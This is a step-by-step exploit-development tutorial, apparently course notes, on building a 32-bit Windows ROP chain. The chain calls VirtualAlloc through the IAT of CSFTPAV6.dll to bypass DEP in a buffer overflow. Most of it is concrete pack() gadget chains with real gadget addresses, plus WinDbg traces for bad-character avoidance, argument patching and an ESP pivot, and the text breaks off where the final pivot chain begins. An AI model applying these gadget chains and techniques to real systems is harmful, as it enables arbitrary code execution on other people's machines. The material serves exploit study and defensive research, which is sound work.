# VirtualAlloc ROP
Let's see how we can use VirtualAlloc to bypass DEP.
VirtualAlloc is a Windows API function that can reserve, commit, **or change** the state of a region of pages in the virtual address space of the calling process.
We are going to invoke VirtualAlloc by placing a skeleton of the function call on the stack through the buffer overflow, modifying its address and parameters through ROP, and then return into it. The skeleton should contain the VirtualAlloc address followed by the return address (which should be our shellcode) and the arguments for the function call.
Let's see the skeleton of VirtualAlloc:
```cpp
LPVOID VirtualAlloc(
[in, optional] LPVOID lpAddress,
[in] SIZE_T dwSize,
[in] DWORD flAllocationType,
[in] DWORD flProtect );
```
As shown in the function prototype, VirtualAlloc requires a parameter (dwSize) for the size of the memory region whose protection properties we are trying to change. 
However, VirtualAlloc can only change the memory protections **on a per-page basis**, so as long as our shellcode is less than **0x1000 bytes** (which will probably always less than such size), we can use any value between 0x01 and 0x1000. 
The two final arguments are predefined enums. 
flAllocationType must be set to the MEM_COMMIT enum value (numerical value 0x00001000), while flProtect should be set to the PAGE_EXECUTE_READWRITE enum value (numerical value 0x00000040).343 
This will allow the memory page to be readable, writable, and executable.

**Note**: Remember that in x86 arguments are passed through the stack, so we need to push them into the stack. and not store them into the register.
**Note**: We will use VirtualAlloc but we could use an analogue function called VirtualProtect for the same purpose, which is changing the memory protections of the **shellcode that is already located in the stack.**

So we will need to push in the stack the following things:
- flProtect
- flAllocationType
- dwSize
- lpAddress
- Return Address (the address of our shellcode in stack)
- Kernel32!VirtualAlloc address

Note that we first insert the latest parameters in the stack, respecting the order in which the original function will access the parameters (the first parameter is the closest to EBP).
Also, as the VirtualAlloc function will perform a "ret" instruction, we want to return to our shellcode so it gets executed after. That is why we add the "Return Addres" (like a `call` instruction would do, but as we aren't doing a `call` to VirtualAlloc and just a direct jump, we have to insert the return address manually). This way, once VirtualAlloc ends, the `ret` instruction will take that return address (where our shellcode starts) and execute it, once the eXecute flag has been set.

Now, let's see the issues that we will have to handle:
1. We do not know the VirtualAlloc address beforehand. This is in the kernel32 library, which has ASLR enabled.
2. We **do not know the return address** (where our shellcode is) and the **lpAddress** (where our shellcode is) argument beforehand.
3. dwSize, flAllocationType, and flProtect contain NULL bytes.

We can deal with these problems by sending placeholder values in the skeleton. Then we will assemble ROP gadgets that will dynamically fix the values we have inserted in the stack, replacing them with the correct ones.

Let's update the exploit to attach these values before the return address (therefore the exploit would be: these pushed values, the EIP overwrite, and the ROP chain to modify these values).
The following image depicts what we are doing:
![](content/images/post_images/rop_1%201.png)

We will insert the following values: 
```
va = pack("<L", (0x45454545)) # dummy VirutalAlloc Address  
va += pack("<L", (0x46464646)) # Shellcode Return Address  
va += pack("<L", (0x47474747)) # # dummy Shellcode Address  
va += pack("<L", (0x48484848)) # dummy dwSize  
va += pack("<L", (0x49494949)) # # dummy flAllocationType  
va += pack("<L", (0x51515151)) # dummy flProtect
```
Now, when we print ESP, we can see that the values are not inserted properly in the stack, as the value of our shellcode address and flAllocationType are 00000000:
```c
0:077> dd esp - 24
014ae2e8  41414141 41414141 45454545 46464646
014ae2f8  00000000 48484848 00000000 51515151
014ae308  42424242 43434343 43434343 43434343
```
However, this won’t impact us since we’re going to overwrite them again with ROP, but it's something we need to notice. Always inspect if the values you inserted in the stack are being properly reflected when the code is executed.

# Patching VirtualAlloc dummy address using ROP
First we need the stack address of the **first dummy value in the stack**, which is the VirtualAlloc dummy address using ROP gadgets. This value is needed so we can patch it afterwards.
The easiest way to obtain a stack address close to the dummy values is to use the ESP value at the time of the access violation (which, if we see the image, it points to the ROP chain):
![](content/images/post_images/rop_1%201.png)

We cannot modify the ESP register, since it must always point to the next gadget for ROP to function. Instead, we will copy its value to another register.
A gadget like “MOV EAX, ESP ; RET” would be ideal, but they typically do not exist as natural opcodes.
We will need to search for another gadget, like the following one:

```
0x50501110: push esp ; pop REG ; ret
```
This way we push the value of esp to the top of the stack and then we save it via `pop` to any register. 
Our program does not have that type of gadget, but it does have the following gadget:
```
0x50501110: push esp ; push eax ; pop edi ; pop esi ; ret
```

That will push the ESP value to the stack, with the value of the register EAX (we don't care). That way, we pop the value of EAX into EDI and the value of ESP into ESI. This way, the ESI register will contain the ESP address, as desired.

Let's search for alternative gadgets that can help us:
```
0x505010a7: push esp ; push eax ; pop edi ; pop esi ; retn 0x0004 ;  (1 found)
```
In this case, the ESP pointer gets modified by the `retn 0x0004` so it's not very useful...
```
0x505375cf: push esp ; push eax ; pop edi ; mov eax, esi ; pop esi ; ret  ;  (1 found)
```
This is very good because it adds an additional `mov eax, esi` but the `pop esi` instruction overried the value in `esi` with the value of `esp`.

**Note:** The "pure" rop gadgets like `pop esp, ret` are not very common as normal programs would not normally do that. So most of the time we will need combined gadgets.
## 1. Obtaining the location of the VirtualAlloc parameter in stack
The `csftpav6.dll` module uses `VirtualAlloc`, which is the function we want to execute. We need the address of this function. However, the address of the `VirtualAlloc` symbol **is not predictable**. This is because this symbol is inside `ntdll.dll`, which has ASLR enabled. When this module is mapped in the memory, the address is randomized and therefore the address of this symbol will be randomized.

However, remember that each of the imported functions that a module need are inside the `IAT` of the module. The entry of `VirtualAlloc` in the `csftpav6.dll` **has a FIXED offset**. When this function is mapped in memory, the entry of the IAT will be fulfilled dinamically with the address of `VirtualAlloc`. Therefore, our approach will be to search inside the IAT for the address of VirtualAlloc.
![](content/images/post_images/rop_2.png)
This is the address of VirtualAlloc inside the IAT. This means that we can use the IAT entry along with a memory dereference to fetch the address of VirtualAlloc at runtime. We’ll do this as part of our ROP chain.
With a way to resolve the address of VirtualAlloc, we must understand how to use it. In the previous step, we placed a dummy value (0x45454545) on the stack for this API address as part of our buffer overflow, which we need to overwrite. 
To do this overwrite, we will need to perform **three tasks with our ROP gadgets.** 
First, locate the address on the stack where the dummy DWORD is. Second, we need to resolve the address of VirtualAlloc. Finally, we need to write that value on top of the placeholder value.

We are going to need multiple gadgets for each of these tasks.
First we have to see the offset of our dummy value from the ESP. By inspecting ESP at the moment of the ROP chain, we can see that our temporal VirtualAlloc value is at offset -1C from ESP:
```c
0:006> dd esp - 1C 
0d39e300 45454545 46464646 00000000 48484848
0d39e310 00000000 51515151 42424242 43434343 
0d39e320 43434343 43434343 43434343 43434343
```
The dummy value 0x45454545, which represents the location of the VirtualAlloc address, is at a negative offset of 0x1C from ESP. Ideally, since we have a copy of the ESP value in ESI, we would like to locate a gadget similar to the following:
```c
sub esi, 0x1c
ret
```
This way we would have a pointer to the location of the VirtualAlloc address in the stack.
Sadly, we couldn’t find this gadget or a similar one in CSFTPAV6.
We’ll need to be a bit more creative.
We could put the 0x1C value on the stack as part of our overflowing buffer and then pop that value into another register of our choice using a gadget. This would allow us to subtract the two registers (esi and the register that stores 0x1c) and get the desired address.

**Note:** As we are going to perform arithmetic opertion with registers, we should dump the value in `esi` to `eax` or `ecx` as these registers commonly use these operations. The number of gadgets that we will find will be much higher.
The idea is to have a gadget put a copy of ESI into EAX, then pop the negative value into ECX from the stack. Next, we add ECX to EAX, and finally, copy EAX back into ESI.
One gadget that would be valid is:
```
0x5050118e: mov eax, esi ; pop esi ; ret  ;  (1 found)
```

The thing is that this gadgets perform an additional `pop esi` instruction, which means that we will need to add an additional DWORD in the stack for this instruction.
We will do it like this:
```
rop = pack("<L", (0x5050118e)) # mov eaax, esi; pop esi; retn
rop += pack("<L", (0x42424242)) # junk for the pop esi value
```
**Note:** Usually, when debugging gadgets in our program, put a breakpoint at the gadget address you want to debug, or at the address of the first gadget in the chain. This way you skip the previous analysis, and go direcly to the gadget.  We let the execution go to the end of the first gadget with the pt command and finish its execution with the p command.

If we debug this gadget, we will find that `eax` will contain the value in `esi` (nice) and that `esi` has the dummy value (we don't care about `esi` anymore as our value is now in `eax`, which is better for arithmetic gadgets). 
Let's see this gadget on debugging:
```c
0:077> p
eax=00000000 ebx=05aec298 ecx=0185ca60 edx=77042da0 esi=0185e30c edi=00000000
eip=5050118e esp=0185e310 ebp=51515151 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
CSFTPAV6+0x118e:
5050118e 8bc6            mov     eax,esi
0:077> p
eax=0185e30c ebx=05aec298 ecx=0185ca60 edx=77042da0 esi=0185e30c edi=00000000
eip=50501190 esp=0185e310 ebp=51515151 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
CSFTPAV6+0x1190:
50501190 5e              pop     esi
0:077> p
eax=0185e30c ebx=05aec298 ecx=0185ca60 edx=77042da0 esi=42424242 edi=00000000
eip=50501191 esp=0185e314 ebp=51515151 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
CSFTPAV6+0x1191:
50501191 c3              ret
0:077> dd eax
0185e30c  5050118e 42424242 43434343 43434343
0185e31c  43434343 43434343 43434343 43434343
0185e32c  43434343 43434343 43434343 43434343
```
As seen, `esi` contains our dummy value on top of the stack and then `eax` has the original `esi` value (pointer to our original ESP location, the location of the first ROP gadget).
Next, we have to pop the -0x1C value into ECX and add it to EAX. We can use a “POP ECX” instruction to get the negative value into ECX, followed by a gadget containing an “ADD EAX, ECX” instruction. This will allow us to add -0x1C to EAX
Let's search for this gadgets, will probably be pure as they are common operations:
```
0x505115a3: pop ecx ; ret  ;  (1 found)
0x5051579a: add eax, ecx ; ret  ;  (1 found)
```

Now we have to insert these two gadgets and the 0x1c value after the first gadget:
```
rop += pack("<L", (0x505115a3)) # pop ecx ; ret  
rop += pack("<L", (0xffffffe4)) # -0x1C  
rop += pack("<L", (0x5051579a)) # add eax, ecx ; ret
```
Note how the -0x1c is calculated, it is done like this:
- **(28)** in binary (32 bits):  
 `00000000 00000000 00000000 00011100`
- **Inverting the bits**:  
`11111111 11111111 11111111 11100011`
- **Add 1** (complemento a dos):  
`11111111 11111111 11111111 11100100`

Now, inserting these gadget at the end shows us that the EAX points to our VirtualAlloc address in the stack, meaning that we already have a pointer to this value in EAX:
```c
0:004> p
eax=0245e30c ebx=06651db0 ecx=ffffffe4 edx=77042da0 esi=42424242 edi=00000000
eip=5051579a esp=0245e320 ebp=51515151 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
CSFTPAV6!FtpUploadFileW+0x48fc:
5051579a 03c1            add     eax,ecx
0:004> p
eax=0245e2f0 ebx=06651db0 ecx=ffffffe4 edx=77042da0 esi=42424242 edi=00000000
eip=5051579c esp=0245e320 ebp=51515151 iopl=0         nv up ei pl nz ac pe cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000217
CSFTPAV6!FtpUploadFileW+0x48fe:
5051579c c3              ret
0:004> dd eax L1
0245e2f0  45454545 46464646 00000000 48484848
0245e300  00000000 00000000 0245e30c 5050118e
```
With the correct value in EAX, we need to move that value back to ESI so we can use it in the next stages. We can do this with a gadget containing “PUSH EAX” and “POP ESI” instructions:
```c
rop = pack("<L", (0x5050118e)) # mov eax,esi ; pop esi ; retn  
rop += pack("<L", (0x42424242)) # junk  
rop += pack("<L", (0x505115a3)) # pop ecx ; ret  
rop += pack("<L", (0xffffffe4)) # -0x1C  
rop += pack("<L", (0x5051579a)) # add eax, ecx ; ret  
rop += pack("<L", (0x50537d5b)) # push eax ; pop esi ; ret
```
This way we can use EAX while ESI contains the calculated address.
The next step is to get the VirtualAlloc address of the IAT and load it into a register.
## 2. Fetching the location of the VirtualAlloc address in the IAT via ROP
We previously found that the IAT address for VirtualAlloc is 0x5054A220, **but we must remember that 0x20 is a bad character for our exploit.**
To solve this, we can increase its address by one and then use a couple of gadgets to decrease it to the original value.
First, we will use a POP EAX instruction to fetch the modified IAT address into EAX.
Then, we will pop -0x01 into ECX through a POP ECX instruction.
Lastly, we will add the value of ECX into EAX, which will be like substracting 0x01 into EAX to obtain our desired value.
**Note how we are going to reused the previous gadgets as they are still useful:**
```c
rop += pack("<L", (0x5051680a)) # pop eax ; ret  
rop += pack("<L", (0xFFFFFFFF)) # -0x01  
rop += pack("<L", (0x505115a3)) # pop ecx ; ret  
rop += pack("<L", (0x5054A221)) # VirtualAlloc address in IAT of module  
rop += pack("<L", (0x5051579a)) # add eax, ecx ; ret
```

This way, `eax` will contain the IAT address where `VirtualAlloc` is located. But we want to access such memory address to get the real location of the function. We manage to do this by referencing the register:
```c
rop += pack("<L", (0x5051f278)) # mov eax, dword [eax] ; ret
```
This way, the value inside `eax` (IAT pointer) is obtained and stored in `eax`. Now, `eax` contains the real address of VirtualAlloc:
```c
Breakpoint 0 hit
eax=5054a220 ebx=064fb018 ecx=5054a221 edx=77042da0 esi=0102e2f0 edi=00000000
eip=5051f278 esp=0102e33c ebp=51515151 iopl=0         nv up ei pl nz ac po cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000213
CSFTPAV6!FtpUploadFileW+0xe3da:
5051f278 8b00            mov     eax,dword ptr [eax]  ds:0023:5054a220={KERNEL32!VirtualAllocStub (76605680)}
0:002> p
eax=76605680 ebx=064fb018 ecx=5054a221 edx=77042da0 esi=0102e2f0 edi=00000000
eip=5051f27a esp=0102e33c ebp=51515151 iopl=0         nv up ei pl nz ac po cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000213
CSFTPAV6!FtpUploadFileW+0xe3dc:
5051f27a c3              ret
0:002> u eax
KERNEL32!VirtualAllocStub:
76605680 8bff            mov     edi,edi
76605682 55              push    ebp
76605683 8bec            mov     ebp,esp
76605685 5d              pop     ebp
76605686 ff2540b86676    jmp     dword ptr [KERNEL32!_imp__VirtualAlloc (7666b840)]
7660568c cc              int     3
7660568d cc              int     3
7660568e cc              int     3
```

We successfully jumped to the `VirtualAlloc` function! `eax` contains a pointer to this value.

## 3. Patching VirtualAlloc address with the obtained one
The last step is to replace the value we have in the location pointed by `esi`, which is the address in the stack that holds the dummy value of VirtualAlloc, for this obtained value.
If we think a bit, a `mov [esi], eax` gadget will be enough:
```
0x50524ea4: mov dword [esi], eax ; ret  ;  (1 found)
```
Let's add this gadget in our ROP chain and see the final value of the address pointed by `esi`:
```c
0:002> p
eax=76605680 ebx=066db7a8 ecx=5054a221 edx=77042da0 esi=00fbe2f0 edi=00000000
eip=50524ea4 esp=00fbe340 ebp=51515151 iopl=0         nv up ei pl nz ac po cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000213
CSFTPAV6!FtpUploadFileW+0x14006:
50524ea4 8906            mov     dword ptr [esi],eax  ds:0023:00fbe2f0=45454545
0:002> p
eax=76605680 ebx=066db7a8 ecx=5054a221 edx=77042da0 esi=00fbe2f0 edi=00000000
eip=50524ea6 esp=00fbe340 ebp=51515151 iopl=0         nv up ei pl nz ac po cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000213
CSFTPAV6!FtpUploadFileW+0x14008:
50524ea6 c3              ret
0:002> dds esi L1
00fbe2f0  76605680 KERNEL32!VirtualAllocStub
```

If we inspect the stack (a bit down as we have inserted a lot of gadgets) we can see that the address pointed by `esi` is the dummy value, that has been replaced with the correct value of `VirtualAlloc`:
```c
 0:002> dds esp - 54
00fbe2ec  41414141
00fbe2f0  76605680 KERNEL32!VirtualAllocStub // [esi] pointed here, we managed to overwrite this value
00fbe2f4  46464646
00fbe2f8  00000000
00fbe2fc  48484848
00fbe300  00000000
00fbe304  00000000
00fbe308  00fbe30c
00fbe30c  5050118e CSFTPAV6+0x118e // These are our ROP gadgets and values
00fbe310  42424242
00fbe314  505115a3 CSFTPAV6!FtpUploadFileW+0x705
00fbe318  ffffffe4
00fbe31c  5051579a CSFTPAV6!FtpUploadFileW+0x48fc
00fbe320  00fbe2f0
00fbe324  5053a0f5 CSFTPAV6!FtpUploadFileW+0x29257
00fbe328  ffffffff
00fbe32c  505115a3 CSFTPAV6!FtpUploadFileW+0x705
00fbe330  5054a221 CSFTPAV6!FtpUploadFileW+0x39383
00fbe334  5051579a CSFTPAV6!FtpUploadFileW+0x48fc
00fbe338  5051f278 CSFTPAV6!FtpUploadFileW+0xe3da
00fbe33c  50524ea4 CSFTPAV6!FtpUploadFileW+0x14006
```

# Patching the return address (our shellcode) using ROP
Remember that we inserted a dummy address prior to the call to VirtualAlloc? This is the dummy address that will be in the top of the stack when VirtualAlloc executes the `ret` instruction. As we haven't performed a call instruction as we are jumping via gadgets, we have to push the dummy address manually. 
Now, we pushed a dummy address, that we need to patch with the dynamic address of where our shellcode is located. We will do basically the same as we did with VirtualAlloc: First, we must align ESI with the placeholder value for the return address on the stack. Then we need to dynamically locate the address of the shellcode and use it to patch the placeholder value.

**Note: We can avoid starting from 0 as when the last ROP chain was executed, ESI was storing the address of VirtualAlloc, which is 4 bytes lower than the return address.** Remember what information do your register contain in order to reuse it. An instruction like `add esi, 0x04` would be great but it's not available in this module.
In our case, we can find an INC ESI instruction. It's not clean, but there are several gadgets that can do not have bad side effects, like the following:
```
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
```
Note that the INC instruction increments the register by one byte, so we have to add the instruction four times in order to increment esi by four bytes. The side effect will only modify EAX, which we do not have to worry about at this point:

```python
# Step 2. Modify the shellcode address, return address, for our dynamically obtained shellcode address.  
# Substract 4 bytes from ESI so it points to our dummy shellcode address in stack (0x46464646)  
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret  
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret  
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret  
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
```

Once the four gadgets are executed, if we take a look at esi, it points to our controlled shellcode dummy value in the stack:
```c
0:006> dd esi L1 
0d4fe304 46464646
``` 

With ESI aligned correctly, we need to get the shellcode address in EAX so that we can reuse the “`MOV DWORD [ESI], EAX ; RET`” gadget to patch the placeholder value. The issue we face now is that we do not know the exact address of the shellcode since it will be placed after our ROP chain, which we haven’t finished creating yet. Note that we don't know where our shellcode will be as we will place it **after the ROP chain, and not before it, as we have been doing in the previous buffer overflow techniques.**

The approach to patch the value after we have placed all the ROP gadgets is using the value in ESI and adding a fixed value to it. Once we finish building the ROP chain, we can update the fixed value to correctly align with the beginning of the shellcode.

First, we need to copy ESI into EAX. We need to do this in such a way that we keep the existing value in ESI in a register like EAX as a backup, since we need it there to patch the placeholder value.
The idea is to:
- have in ESI the address of the pointer to our shellcode
- have in EAX the address of our shellcode
So then we can fix `[ESI] with EAX` properly. Now we will use a dummy EAX value, like `ESI` minus a certain fixed offset, just to have the gadgets properly stored in the stack. We will replace the offset value afterwards.
An instruction like “MOV EAX, ESI” is optimal, but unfortunately, the only gadgets containing this instruction also pop a value into ESI. We can however solve this by restoring the value in ESI with the previously-used “PUSH EAX ; POP ESI ; RET” gadget. This way we can do the following:
```c
rop += pack("<L", (0x5050118e)) # mov eax, esi ; pop esi ; ret  
rop += pack("<L", (0x42424242)) # junk  
rop += pack("<L", (0x5052f773)) # push eax ; pop esi ; ret
```
We basically have now the same value in ESI and EAX.
Now, we add the offset to EAX. Remember that it is a dummy offset. **Note: Do not use badchars for the offsets, even if they are dummy. For example, instead 0x200, use 0x210.**
```
rop += pack("<L", (0x505115a3)) # pop ecx ; ret  
rop += pack("<L", (0xfffffdf0)) # -0x210  
rop += pack("<L", (0x50533bf4)) # sub eax, ecx ; ret
```

Here we have substracted EAX 210 bytes (dummy quantity). Once we know the exact offset from ESI to the shellcode, we can update the 0xfffffdf0 value to the correct one. At this point, EAX contains a placeholder address for our shellcode, which we can update once we finish building the entire ROP chain.

**Note: See how we have reused several gadgets for this section! Not only gadgets, but also the value of the registers that are already stored due to prior gadget chains.**

# Patching arguments to VirtualAlloc
We have successfully created and executed a partial ROP chain that locates the address of VirtualAlloc from the IAT and the shellcode address, and then updates the API call skeleton on the stack.

In this section, we must patch all four arguments required by VirtualAlloc to disable DEP.
Let's recap the function prototype of VirtualAlloc:
```c
LPVOID VirtualAlloc(
[in, optional] LPVOID lpAddress,
[in] SIZE_T dwSize,
[in] DWORD flAllocationType,
[in] DWORD flProtect );
```

Normally, we want the following:
- lpAddress should be the same value as the return address (the value of our shellcode)
- dwSize to be 0x01
- flAllocationType 0x1000
- flProtect 0x40

## Patching lpAddress
Regarding lpAddress, we first need to know where this address is in the stack. If we take a look, we can see that it is 4 bytes lower than the ESI register (which contain the return address) so we can increment ESI by four in order to have control over lpAddress. Let's use the same increment instructions:
 ```c
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret  
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret  
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret  
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
```

Additionally, since lpAddress needs to point to our shellcode, we can reuse the same gadgets as before and only subtract a different negative value from EAX. 
In the previous example, we used the somewhat arbitrary value of -0x210 to align EAX to our shellcode. Since we increased ESI by 4, we need to use -0x20C or 0xfffffdf4 this time, as shown in the updated ROP chain below.
We will reproduce the ROP chain to copy ESI value into EAX and then substract EAX 0x20c:
```c
rop += pack("<L", (0x5050118e)) # mov eax, esi ; pop esi ; ret  
rop += pack("<L", (0x42424242)) # junk  
rop += pack("<L", (0x5052f773)) # push eax ; pop esi ; ret  
rop += pack("<L", (0x505115a3)) # pop ecx ; ret  
rop += pack("<L", (0xfffffdf4)) # -0x20c  
rop += pack("<L", (0x50533bf4)) # sub eax, ecx ; ret  
rop += pack("<L", (0x5051cbb6)) # mov dword [esi], eax ; ret
```
It is getting a lot easier to expand on our technique because we have already located most of the required gadgets and performed similar actions.

Now if we run the code, and inspect lpAddress and the return address, they should point to the same dummy address. Once we know the real offset from the shellcode, we will fix the offset and they should point to the shellcode address.

## Patching dwSize
Now we are going to move to dwSize, which we can set to 0x01, since VirtualAlloc will apply the new protections on the entire memory page.
The issue is that the value is really a DWORD (0x00000001), so it will contain null bytes. We can't perform a mov or an inc instruction, so we need to use another technique.
The new technique that we will use is the `neg` instruction. This instruction will replace the value in a register for its two's complement. This is equivalent to substract the value from zero.
In 32 bits we can abuse the fact that we can perform this operation and ignore the upper DWORD of the result to obtain the value we want.

For example, if we want to obtain 0x00000001, we can substract ffffffff from 0 and take the lower DWORD:
```
0:006> ? 0 - ffffffff
Evaluate expression: -4294967295 = ffffffff`00000001
```
Stripping the upper part is done automatically since registers on a 32-bit operating system can only contain the lower DWORD. Note that this is not valid per se in x64 and we would have to truncate the register (as the ffffffff value would exist after the calculation).
Therefore, if we want to obtain a 0x01 value, we can just negate fffffffff from a register. 
**Note: In 32 bits, we can use neg (compliment of two) of any value to obtain the same value but in positive, in the case that the value has null bytes.***

Once again, we must point to the dwSize variable in the stack to modify it. And once again, this variable is 4 bytes higher than ESI. So we can increment ESI by four again and then pop the value 0xffffffff into eax and negate it. Lastly, we can override the value that dwSize has for this value in EAX, which is 0x01.
## Patching flAllocationType
Now we must move to flAllocationType, which must be set to 0x1000. 
We could try to reuse the trick of negation but we notice that two’s complement to 0x1000 is 0xfffff000, which also contains null bytes, so we keep having the problems:
```
0:063> ? 0 - 1000
Evaluate expression: -4096 = fffff000
````

While it would be possible to perform some tricks to fix this problem, we are going to use a different technique to highlight the fact that when selecting gadgets, we must often think creatively. We’re going to use the existing gadgets we found, which will allow us to pop arbitrary values into EAX and ECX and subsequently perform an addition of them.

We want to have 0x1000 as our final value in any register.
We can substract any value with non-null badchars from 0x1000 and we can take the DWORD of the result and add it to the value we have chosen. This results in our 0x1000 value again, but we replace 0x1000 for these two values, the one we have chosen and the DWORD of the result, to obtain our desired value.
Let's see it graphically:
```c
0:063> ? 1000 - 80808080
Evaluate expression: -2155901056 = ffffffff`7f7f8f80

0:063> ? 80808080 + 7f7f8f80
Evaluate expression: 4294971392 = 00000001`00001000
```
**Note**: Both values, the one chosen and its DWORD result from substraction, should not have badchars. It is recommended to choose long values.
Now we need to update our ROP chain to pop 0x80808080 into EAX, pop 0x7f7f8f80 into ECX, and then add them together to obtain 0x1000 (due to the 32 bit truncation). Remember that to access flAllocationType dummy address we have to increment ESI by four again.
```c
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret  
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret  
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret  
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret  
rop += pack("<L", (0x5053a0f5)) # pop eax ; ret  
rop += pack("<L", (0x80808080)) # first value to be added  
rop += pack("<L", (0x505115a3)) # pop ecx ; ret  
rop += pack("<L", (0x7f7f8f80)) # second value to be added  
rop += pack("<L", (0x5051579a)) # add eax, ecx ; ret  
rop += pack("<L", (0x5051cbb6)) # mov dword [esi], eax ; ret
```
**Note: due to the reuse of some gadgets, we can create conditional breakpoint to stop in a gadget but only if the value of the registers are the ones we want. For example, here stop in 0x505179a only if EAX is 0x80808080**:
```
bp 0x5051579a ".if (@eax & 0x0`ffffffff) = 0x80808080 {} .else {gc}"
```

## Patching flProtect
The last argument is the new memory protection value, which, in essence, is what allows us to bypass DEP. We want the enum PAGE_EXECUTE_READWRITE, which has the numerical value 0x40.
In order to write that to the stack, we will reuse the same technique we did for flAllocationType.
As it has null bytes (0x00000040) we have to do the neg trick. Let's find out the value:
```c
0:063> ? 40 - 80808080
Evaluate expression: -2155905088 = ffffffff`7f7f7fc0
0:063> ? 80808080 + 7f7f7fc0
Evaluate expression: 4294967360 = 00000001`00000040
```
According to the additions, we can use the values 0x80808080 and 0x7f7f7fc0 to obtain the desired value of 0x40. This would be the ROP chain to patch flProtect, doing everything we have done for the other variables (EIP increment, setting up the operations and patching the value in the address):
```c
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret  
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret  
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret  
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret  
rop += pack("<L", (0x5053a0f5)) # pop eax ; ret  
rop += pack("<L", (0x80808080)) # first value to be added  
rop += pack("<L", (0x505115a3)) # pop ecx ; ret  
rop += pack("<L", (0x7f7f7fc0)) # second value to be added  
rop += pack("<L", (0x5051579a)) # add eax, ecx ; ret  
rop += pack("<L", (0x5051cbb6)) # mov dword [esi], eax ; ret
```
**Note: We have finished our full exploit with all the gadgets. A recommendation is to add the following gadget that will make a software breakpoint, in order to execute the entire ROP chain and catch the execution flow jut after the flProtect value has been patched:**
```c
rop += pack("<L", (0x5051e4db)) # int3 ; push eax ; call esi
```
Note that only int3 will be executed, the other instructions will get paused. Remember to remove it after inspecting that everything works:
```c
0:078> g
(16b0.4c0): Break instruction exception - code 80000003 (first chance)
eax=00000040 ebx=05aebf60 ecx=7f7f7fc0 edx=77292da0 esi=0184e304 edi=00000000
eip=5051e4db esp=0184e40c ebp=51515151 iopl=0         nv up ei pl nz na po cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000203
CSFTPAV6!FtpUploadFileW+0xd63d:
5051e4db cc              int     3


0:055> dds esi - 14
0184e2f0  76c05680 KERNEL32!VirtualAllocStub
0184e2f4  0184e504
0184e2f8  0184e504
0184e2fc  00000001
0184e300  00001000
0184e304  00000040
```
As we can see in ESI and lower locations the prepared call stack for the VirtualAlloc function has been prepared. We have the correct address for VirtualAlloc, the return address, and the four parameters: lpAddress, dwSize, flAllocationType and lpProtect.

# Fixing ESP to execute VirtualAlloc
The ROP chain to set up the address for VirtualAlloc, the return address, and all four arguments has been created and verified to work. The only step that remains to bypass DEP is to invoke the API.
In order to invoke the API, we must jump to the "VirtualAlloc" address in the stack.
How do we jump? By forcing ESP to point to such address and then performing a ret instruction (ret single gadget).
In order to force ESP to point to such address, we must perform a ROP chain to move ESP here:
```
0:055> dds esi - 14
0184e2f0  76c05680 KERNEL32!VirtualAllocStub <- ESP SHOULD POINT HERE
0184e2f4  0184e504
0184e2f8  0184e504
0184e2fc  00000001
0184e300  00001000
0184e304  00000040
```

**Note that the return address and lpAddress do not point to our shellcode yet. We need to fix these values later. Let's focus on the ROP chain needed to ESP to point to this address.** 

Sadly, there is no simple way to modify ESP, so we must take a small detour. The only useful gadget we found for this task is a MOV ESP, EBP ; POP EBP ; RET. 
However, this is only useful is EBP previously points to our VirtualAlloc address in the stack.
Let's force EBP to point to our VirtualAlloc address.

First, we must remember that when the ROP chain has been finished patching the arguments of VirtualAlloc, ESI will contain the address of the last parameter (flProtect). We can use this address and substract the bytes from this address to the address of VirtualAlloc in the stack.
Any small value will contain null bytes, so instead we can leverage the fact that when 32-bit registers overflow, any bits higher than 32 will be discarded. Instead of subtracting a small value that contains null bytes, we can add a large value. This will allow us to align EAX with the VirtualAlloc address on the stack.
**Note: If you have to add a value to another one, in 32 bits you can abuse the fact that adding a large value will overflow. Sometimes adding a large value is the same as adding a small value (with badchars). Only 32 bits.**

Therefore, what we will do is:
- Use EIP that is near our desired address.
- Move EIP to EAX
- Substract some bytes to EAX to reach our desired address in the stack (**Note**: we do this in EAX as there are more gadgets with EAX).
- Move EAX to EBX
- Move EBX to ESP

We have to move EAX to EBX and then EBX to ESP as there are not direct gadgets. Therefore, we have to play a bit with the registers.

The gadget that moves EBP into ESP has a side effect of popping a value into EBP. We must compensate for this and configure the stack so that a dummy DWORD just before the VirtualAlloc address is popped into EBP.

The gadget chain to move ESP to our desired address is the following:
```c
# Put ESP to point to VirtualAlloc address in stack.  
# In order to set ESP, we need gadgets that operate with ESI, EAX, ECX, EBP and finally ESP.  
